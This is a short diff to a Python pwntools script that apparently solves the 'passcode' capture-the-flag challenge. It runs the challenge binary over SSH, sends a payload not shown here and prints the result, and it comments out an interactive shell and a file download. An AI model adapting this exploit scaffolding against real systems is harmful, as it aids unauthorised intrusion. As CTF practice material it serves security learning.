@@ -1,6 +1,5 @@
 #!/usr/bin/python
 # -*- coding: UTF-8 -*-
-#下载服务器上的文件
 import os
 import sys
 from pwn import *
@@ -11,10 +10,11 @@ def dec():
         sh = s.process('passcode')
         sh.sendline(payload)
         print sh.recvall()
-        s.interactive()
-        file_dir = 'passcode.c'
-        local_dir = '~'
-        s.download(file_dir, local_dir)
+        # s.interactive()
+        #下载服务器上的文件
+        # file_dir = 'passcode.c'
+        # local_dir = '~'
+        # s.download(file_dir, local_dir)
     except:
         print "error"
 
